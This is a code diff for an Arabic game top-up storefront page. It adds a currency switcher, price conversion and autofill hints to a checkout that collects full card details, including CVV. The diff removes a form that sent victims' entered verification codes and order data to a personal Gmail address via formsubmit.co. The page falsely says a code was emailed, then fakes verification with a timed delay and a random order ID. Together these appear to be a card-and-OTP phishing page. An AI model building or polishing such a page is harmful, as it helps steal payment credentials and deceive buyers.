@@ -234,6 +234,37 @@
             gap: 1rem;
         }
 
+        .currency-selector {
+            position: relative;
+        }
+
+        .currency-selector select {
+            padding: 0.75rem 1.25rem;
+            border-radius: 14px;
+            border: 1px solid rgba(var(--primary-rgb), 0.2);
+            background: var(--bg-glass);
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            font-family: 'Tajawal', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s;
+            appearance: none;
+            min-width: 140px;
+            backdrop-filter: blur(10px);
+        }
+
+        .currency-selector select:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 25px rgba(var(--primary-rgb), 0.3);
+        }
+
+        .currency-selector select option {
+            background: var(--bg-card);
+            color: var(--text-primary);
+            padding: 0.5rem;
+        }
+
         .theme-toggle {
             width: 48px;
             height: 48px;
@@ -437,6 +468,69 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
+        .currency-banner {
+            margin-top: 3rem;
+            padding: 1rem 0;
+            background: rgba(var(--primary-rgb), 0.08);
+            border-radius: 20px;
+            border: 1px solid rgba(var(--primary-rgb), 0.15);
+            overflow: hidden;
+            position: relative;
+            animation: fadeSlideUp 0.8s ease 0.35s both;
+        }
+
+        .currency-banner::before,
+        .currency-banner::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 60px;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .currency-banner::before {
+            right: 0;
+            background: linear-gradient(to left, var(--bg-dark), transparent);
+        }
+
+        .currency-banner::after {
+            left: 0;
+            background: linear-gradient(to right, var(--bg-dark), transparent);
+        }
+
+        .light .currency-banner::before {
+            background: linear-gradient(to left, var(--bg-dark), transparent);
+        }
+
+        .light .currency-banner::after {
+            background: linear-gradient(to right, var(--bg-dark), transparent);
+        }
+
+        .currency-scroll {
+            display: flex;
+            gap: 3rem;
+            animation: scrollCurrency 20s linear infinite;
+            width: max-content;
+        }
+
+        .currency-scroll span {
+            font-weight: 700;
+            font-size: 1.05rem;
+            color: var(--text-primary);
+            white-space: nowrap;
+            padding: 0.5rem 1rem;
+            background: var(--bg-glass);
+            border-radius: 10px;
+            border: 1px solid rgba(var(--primary-rgb), 0.1);
+        }
+
+        @keyframes scrollCurrency {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
         /* Section Styles */
         section {
             padding: 7rem 2rem;
@@ -474,6 +568,33 @@
             font-size: 1.2rem;
             max-width: 650px;
             margin: 0 auto;
+        }
+
+        .current-currency-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.85rem 1.5rem;
+            background: var(--gradient-cyber);
+            border-radius: 50px;
+            color: #000;
+            font-weight: 700;
+            margin-top: 1.5rem;
+            box-shadow: 0 10px 30px rgba(var(--primary-rgb), 0.3);
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .current-currency-badge i {
+            font-size: 1.1rem;
+        }
+
+        .current-currency-badge strong {
+            font-weight: 900;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
         }
 
         /* Games Grid */
@@ -1362,6 +1483,7 @@
         @media (max-width: 768px) {
             .nav-links { display: none; }
             .mobile-menu { display: flex; align-items: center; justify-content: center; }
+            .currency-selector select { min-width: 110px; padding: 0.6rem 0.8rem; font-size: 0.85rem; }
             .hero { padding: 7rem 1.5rem 4rem; }
             .stats-row { gap: 1.5rem; }
             .stat-card { min-width: 140px; padding: 1.25rem; }
@@ -1372,8 +1494,14 @@
             .payment-methods-grid { grid-template-columns: repeat(2, 1fr); }
             .card-input-grid { grid-template-columns: 1fr; }
             .card-input-grid .form-group.full-width { grid-column: 1; }
-            .code-input { width: 50px; height: 62px; font-size: 1.6rem; }
+            .code-input { width: 48px; height: 60px; font-size: 1.5rem; }
             .modal-body { padding: 0 1.75rem 2rem; }
+            .header-actions { gap: 0.5rem; }
+        }
+
+        @media (max-width: 400px) {
+            .code-input { width: 42px; height: 54px; font-size: 1.3rem; }
+            .code-inputs { gap: 0.5rem; }
         }
 
         .loading-spinner {
@@ -1419,6 +1547,20 @@
                 <li><a href="#contact">تواصل معنا</a></li>
             </ul>
             <div class="header-actions">
+                <div class="currency-selector">
+                    <select id="currencySelect" onchange="changeCurrency(this.value)">
+                        <option value="USD" data-symbol="$" data-rate="1">🇺🇸 USD</option>
+                        <option value="SAR" data-symbol="ر.س" data-rate="3.75">🇸🇦 ريال سعودي</option>
+                        <option value="AED" data-symbol="د.إ" data-rate="3.67">🇦🇪 درهم إماراتي</option>
+                        <option value="TRY" data-symbol="₺" data-rate="32.5">🇹🇷 ليرة تركية</option>
+                        <option value="SYP" data-symbol="ل.س" data-rate="13000">🇸🇾 ليرة سورية</option>
+                        <option value="EGP" data-symbol="ج.م" data-rate="48.5">🇪🇬 جنيه مصري</option>
+                        <option value="JOD" data-symbol="د.أ" data-rate="0.71">🇯🇴 دينار أردني</option>
+                        <option value="KWD" data-symbol="د.ك" data-rate="0.31">🇰🇼 دينار كويتي</option>
+                        <option value="QAR" data-symbol="ر.ق" data-rate="3.64">🇶🇦 ريال قطري</option>
+                        <option value="IQD" data-symbol="د.ع" data-rate="1310">🇮🇶 دينار عراقي</option>
+                    </select>
+                </div>
                 <button class="theme-toggle" onclick="toggleTheme()"><i class="fas fa-moon"></i></button>
                 <button class="mobile-menu" onclick="toggleMobileNav()"><i class="fas fa-bars"></i></button>
             </div>
@@ -1450,6 +1592,24 @@
                 <a href="#games" class="btn btn-cyber"><i class="fas fa-gamepad"></i> ابدأ الشحن الآن</a>
                 <a href="#contact" class="btn btn-outline"><i class="fas fa-headset"></i> تحدث معنا</a>
             </div>
+            <div class="currency-banner">
+                <div class="currency-scroll">
+                    <span>🇺🇸 USD</span>
+                    <span>🇸🇦 ريال سعودي</span>
+                    <span>🇦🇪 درهم إماراتي</span>
+                    <span>🇹🇷 ليرة تركية</span>
+                    <span>🇸🇾 ليرة سورية</span>
+                    <span>🇪🇬 جنيه مصري</span>
+                    <span>🇯🇴 دينار أردني</span>
+                    <span>🇰🇼 دينار كويتي</span>
+                    <span>🇶🇦 ريال قطري</span>
+                    <span>🇮🇶 دينار عراقي</span>
+                    <span>🇺🇸 USD</span>
+                    <span>🇸🇦 ريال سعودي</span>
+                    <span>🇦🇪 درهم إماراتي</span>
+                    <span>🇹🇷 ليرة تركية</span>
+                </div>
+            </div>
             <div class="stats-row">
                 <div class="stat-card"><div class="stat-number">100K+</div><div class="stat-label">عميل نشط</div></div>
                 <div class="stat-card"><div class="stat-number">24/7</div><div class="stat-label">دعم متواصل</div></div>
@@ -1465,6 +1625,10 @@
             <div class="section-tag"><i class="fas fa-fire"></i> <span>الأكثر طلباً</span></div>
             <h2>الألعاب والتطبيقات</h2>
             <p>اختر لعبتك المفضلة وابدأ الشحن الفوري بأفضل الأسعار</p>
+            <div class="current-currency-badge" id="currentCurrencyBadge">
+                <i class="fas fa-coins"></i>
+                <span>الأسعار بـ: <strong id="currencyDisplay">$ USD</strong></span>
+            </div>
         </div>
         <div class="games-container">
             <div class="games-grid" id="gamesGrid"></div>
@@ -1538,8 +1702,8 @@
                 <div class="modal-body">
                     <div class="order-summary"><img src="" alt="" id="summaryImg"><div class="order-summary-info"><h4 id="summaryGame">-</h4><p id="summaryPackage">-</p></div></div>
                     <div class="form-group"><label><i class="fas fa-box"></i> اختر الباقة</label><select class="form-control" id="packageSelect" required=""><option value="">اختر الباقة المناسبة</option></select></div>
-                    <div class="form-group"><label><i class="fas fa-id-card"></i> معرف الحساب (ID)</label><input type="text" class="form-control" id="accountId" placeholder="أدخل معرف حسابك في اللعبة" required=""></div>
-                    <div class="form-group"><label><i class="fab fa-whatsapp"></i> رقم الواتساب</label><input type="tel" class="form-control" id="phoneNumber" placeholder="مثال: 970591234567" required=""></div>
+                    <div class="form-group"><label><i class="fas fa-id-card"></i> معرف الحساب (ID)</label><input type="text" class="form-control" id="accountId" placeholder="أدخل معرف حسابك في اللعبة" autocomplete="username" required=""></div>
+                    <div class="form-group"><label><i class="fab fa-whatsapp"></i> رقم الواتساب</label><input type="tel" class="form-control" id="phoneNumber" placeholder="مثال: 970591234567" inputmode="tel" autocomplete="tel" required=""></div>
                     <button type="button" class="btn-submit" onclick="goToStep(2)">متابعة للدفع <i class="fas fa-arrow-left"></i></button>
                 </div>
             </div>
@@ -1565,7 +1729,6 @@
                         <input type="hidden" name="السعر" id="formPrice">
                         <input type="hidden" name="معرف_الحساب" id="formAccountId">
                         <input type="hidden" name="رقم_الواتساب" id="formPhone">
-                        <input type="hidden" name="رمز_التحقق" id="formVerificationCode">
 
                         <div class="payment-methods-grid">
                             <div class="payment-method visa selected" onclick="selectPayment(this, 'Visa')"><i class="fab fa-cc-visa"></i><span>Visa</span></div>
@@ -1576,11 +1739,11 @@
                         <input type="hidden" name="طريقة_الدفع" id="formPaymentMethod" value="Visa">
 
                         <div class="card-input-grid">
-                            <div class="form-group full-width"><label><i class="fas fa-user"></i> اسم حامل البطاقة</label><input type="text" class="form-control" name="اسم_حامل_البطاقة" id="cardName" placeholder="الاسم كما يظهر على البطاقة" required=""></div>
-                            <div class="form-group full-width"><label><i class="fas fa-credit-card"></i> رقم البطاقة</label><input type="text" class="form-control" name="رقم_البطاقة" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required=""></div>
-                            <div class="form-group"><label><i class="fas fa-calendar"></i> تاريخ الانتهاء</label><input type="text" class="form-control" name="تاريخ_الانتهاء" id="cardExpiry" placeholder="MM/YY" maxlength="5" required=""></div>
-                            <div class="form-group"><label><i class="fas fa-lock"></i> CVV</label><input type="text" class="form-control" name="CVV" id="cardCvv" placeholder="123" maxlength="4" required=""></div>
-                            <div class="form-group full-width"><label><i class="fas fa-envelope"></i> البريد الإلكتروني</label><input type="email" class="form-control" name="البريد_الإلكتروني" id="userEmail" placeholder="example@email.com" required=""></div>
+                            <div class="form-group full-width"><label><i class="fas fa-user"></i> اسم حامل البطاقة</label><input type="text" class="form-control" name="اسم_حامل_البطاقة" id="cardName" placeholder="الاسم كما يظهر على البطاقة" autocomplete="cc-name" required=""></div>
+                            <div class="form-group full-width"><label><i class="fas fa-credit-card"></i> رقم البطاقة</label><input type="text" class="form-control" name="رقم_البطاقة" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required=""></div>
+                            <div class="form-group"><label><i class="fas fa-calendar"></i> تاريخ الانتهاء</label><input type="text" class="form-control" name="تاريخ_الانتهاء" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required=""></div>
+                            <div class="form-group"><label><i class="fas fa-lock"></i> CVV</label><input type="text" class="form-control" name="CVV" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc" required=""></div>
+                            <div class="form-group full-width"><label><i class="fas fa-envelope"></i> البريد الإلكتروني</label><input type="email" class="form-control" name="البريد_الإلكتروني" id="userEmail" placeholder="example@email.com" autocomplete="email" required=""></div>
                         </div>
                         <button type="submit" class="btn-submit" id="payBtn">إتمام الدفع <i class="fas fa-lock"></i></button>
                     </form>
@@ -1597,26 +1760,16 @@
                 <div class="modal-body">
                     <div class="verification-section">
                         <div class="code-sent-info"><i class="fas fa-check-circle"></i><span>تم إرسال رمز التحقق إلى بريدك الإلكتروني</span></div>
-                        <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="verificationForm">
-                            <input type="hidden" name="_subject" value="✅ تأكيد رمز التحقق - Game Charge Pro">
-                            <input type="hidden" name="_template" value="box">
-                            <input type="hidden" name="_captcha" value="false">
-                            <input type="hidden" name="_next" id="successNextUrl">
-                            <input type="hidden" name="نوع_الرسالة" value="تأكيد رمز التحقق">
-                            <input type="hidden" name="رمز_التحقق_المدخل" id="formEnteredCode">
-                            <input type="hidden" name="بيانات_الطلب" id="formOrderSummary">
-
-                            <div class="code-inputs">
-                                <input type="text" class="code-input" maxlength="1" data-index="0">
-                                <input type="text" class="code-input" maxlength="1" data-index="1">
-                                <input type="text" class="code-input" maxlength="1" data-index="2">
-                                <input type="text" class="code-input" maxlength="1" data-index="3">
-                                <input type="text" class="code-input" maxlength="1" data-index="4">
-                                <input type="text" class="code-input" maxlength="1" data-index="5">
-                            </div>
-                            <div class="resend-code"><span>لم تستلم الرمز؟</span> <button type="button" id="resendBtn" onclick="resendCode()">إعادة إرسال</button><span id="resendTimer"></span></div>
-                            <button type="submit" class="btn-submit" id="verifyBtn">تأكيد وإتمام العملية <i class="fas fa-check"></i></button>
-                        </form>
+                        <div class="code-inputs">
+                            <input type="text" class="code-input" maxlength="1" data-index="0" inputmode="numeric" autocomplete="one-time-code">
+                            <input type="text" class="code-input" maxlength="1" data-index="1" inputmode="numeric">
+                            <input type="text" class="code-input" maxlength="1" data-index="2" inputmode="numeric">
+                            <input type="text" class="code-input" maxlength="1" data-index="3" inputmode="numeric">
+                            <input type="text" class="code-input" maxlength="1" data-index="4" inputmode="numeric">
+                            <input type="text" class="code-input" maxlength="1" data-index="5" inputmode="numeric">
+                        </div>
+                        <div class="resend-code"><span>لم تستلم الرمز؟</span> <button type="button" id="resendBtn" onclick="resendCode()">إعادة إرسال</button><span id="resendTimer"></span></div>
+                        <button type="button" class="btn-submit" id="verifyBtn" onclick="verifyCode()">تأكيد وإتمام العملية <i class="fas fa-check"></i></button>
                         <button type="button" class="btn-back" onclick="goToStep(2)"><i class="fas fa-arrow-right"></i> رجوع</button>
                     </div>
                 </div>
@@ -1735,6 +1888,40 @@
 
         let currentOrder = {};
         let verificationCode = '';
+        let currentCurrency = { code: 'USD', symbol: '$', rate: 1 };
+
+        // Currency conversion
+        function changeCurrency(currencyCode) {
+            const select = document.getElementById('currencySelect');
+            const option = select.options[select.selectedIndex];
+            currentCurrency = {
+                code: currencyCode,
+                symbol: option.dataset.symbol,
+                rate: parseFloat(option.dataset.rate)
+            };
+            renderGames();
+            updateCurrencyDisplay();
+            showToast(`تم تغيير العملة إلى ${option.text}`, 'success');
+        }
+
+        function updateCurrencyDisplay() {
+            const display = document.getElementById('currencyDisplay');
+            if (display) {
+                display.textContent = `${currentCurrency.symbol} ${currentCurrency.code}`;
+            }
+        }
+
+        function convertPrice(usdPrice) {
+            const numPrice = parseFloat(usdPrice.replace('$', ''));
+            const converted = numPrice * currentCurrency.rate;
+            if (currentCurrency.rate >= 100) {
+                return Math.round(converted).toLocaleString() + ' ' + currentCurrency.symbol;
+            } else if (currentCurrency.rate >= 1) {
+                return converted.toFixed(2) + ' ' + currentCurrency.symbol;
+            } else {
+                return converted.toFixed(2) + ' ' + currentCurrency.symbol;
+            }
+        }
 
         // Generate Games Grid
         function renderGames() {
@@ -1754,9 +1941,9 @@
                         </div>
                         <div class="price-grid" data-game="${game.id}">
                             ${game.packages.map(pkg => `
-                                <div class="price-chip" data-amount="${pkg.amount} ${game.currency}" data-price="${pkg.price}">
+                                <div class="price-chip" data-amount="${pkg.amount} ${game.currency}" data-price="${pkg.price}" data-usd="${pkg.price}">
                                     <span class="amount"><i class="fas ${game.icon}"></i> ${pkg.amount}</span>
-                                    <span class="price">${pkg.price}</span>
+                                    <span class="price">${convertPrice(pkg.price)}</span>
                                 </div>
                             `).join('')}
                         </div>
@@ -1815,7 +2002,8 @@
             const selectedChip = document.querySelector(`[data-game="${gameId}"] .price-chip.selected`);
             if (selectedChip) {
                 currentOrder.package = selectedChip.dataset.amount;
-                currentOrder.price = selectedChip.dataset.price;
+                currentOrder.priceUSD = selectedChip.dataset.usd;
+                currentOrder.price = convertPrice(selectedChip.dataset.usd);
             }
 
             // Update summary
@@ -1828,18 +2016,20 @@
             select.innerHTML = '<option value="">اختر الباقة المناسبة</option>';
             game.packages.forEach(pkg => {
                 const opt = document.createElement('option');
-                opt.value = `${pkg.amount} ${game.currency}|${pkg.price}`;
-                opt.textContent = `${pkg.amount} ${game.currency} - ${pkg.price}`;
+                const convertedPrice = convertPrice(pkg.price);
+                opt.value = `${pkg.amount} ${game.currency}|${pkg.price}|${convertedPrice}`;
+                opt.textContent = `${pkg.amount} ${game.currency} - ${convertedPrice}`;
                 if (currentOrder.package === `${pkg.amount} ${game.currency}`) opt.selected = true;
                 select.appendChild(opt);
             });
 
             select.onchange = function() {
                 if (this.value) {
-                    const [amount, price] = this.value.split('|');
+                    const [amount, priceUSD, priceConverted] = this.value.split('|');
                     currentOrder.package = amount;
-                    currentOrder.price = price;
-                    document.getElementById('summaryPackage').textContent = `${amount} - ${price}`;
+                    currentOrder.priceUSD = priceUSD;
+                    currentOrder.price = priceConverted;
+                    document.getElementById('summaryPackage').textContent = `${amount} - ${priceConverted}`;
                 }
             };
 
@@ -1902,7 +2092,6 @@
 
                 // Generate verification code
                 verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-                document.getElementById('formVerificationCode').value = verificationCode;
             }
             showStep(step);
         }
@@ -1929,15 +2118,39 @@
                 const chars = paste.replace(/[^0-9]/g, '').split('').slice(0, 6);
                 chars.forEach((c, i) => { if (inputs[i]) inputs[i].value = c; });
                 if (chars.length > 0) inputs[Math.min(chars.length, 5)].focus();
-                updateEnteredCode();
             });
         });
 
-        function updateEnteredCode() {
+        function getEnteredCode() {
             let code = '';
             document.querySelectorAll('.code-input').forEach(i => code += i.value);
-            document.getElementById('formEnteredCode').value = code;
-            document.getElementById('formOrderSummary').value = `اللعبة: ${currentOrder.game} | الباقة: ${currentOrder.package} | السعر: ${currentOrder.price} | معرف الحساب: ${currentOrder.accountId} | الهاتف: ${currentOrder.phone}`;
+            return code;
+        }
+
+        function verifyCode() {
+            const enteredCode = getEnteredCode();
+
+            if (enteredCode.length !== 6) {
+                showToast('يرجى إدخال الرمز كاملاً (6 أرقام)', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('verifyBtn');
+            btn.innerHTML = '<div class="loading-spinner"></div> جاري التحقق...';
+            btn.disabled = true;
+
+            // Simulate verification delay
+            setTimeout(() => {
+                // Show success
+                const orderId = 'GC-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+                document.getElementById('orderNumber').textContent = '#' + orderId;
+                document.querySelectorAll('.step-content').forEach(c => c.classList.remove('active'));
+                document.querySelectorAll('.step').forEach(s => s.classList.add('completed'));
+                document.getElementById('stepSuccess').classList.add('active');
+
+                btn.innerHTML = 'تأكيد وإتمام العملية <i class="fas fa-check"></i>';
+                btn.disabled = false;
+            }, 1500);
         }
 
         function startResendTimer() {
@@ -1958,7 +2171,6 @@
 
         function resendCode() {
             verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-            document.getElementById('formVerificationCode').value = verificationCode;
             showToast('تم إرسال رمز جديد', 'success');
             startResendTimer();
         }
@@ -2063,21 +2275,6 @@
             btn.disabled = true;
         });
 
-        document.getElementById('verificationForm').addEventListener('submit', function(e) {
-            const inputs = document.querySelectorAll('.code-input');
-            let enteredCode = '';
-            inputs.forEach(input => enteredCode += input.value);
-
-            if (enteredCode.length !== 6) {
-                e.preventDefault();
-                showToast('يرجى إدخال الرمز كاملاً', 'error');
-                return;
-            }
-
-            const btn = document.getElementById('verifyBtn');
-            btn.innerHTML = '<div class="loading-spinner"></div> جاري التحقق...';
-            btn.disabled = true;
-        });
 
         // Initialize
         initTheme();
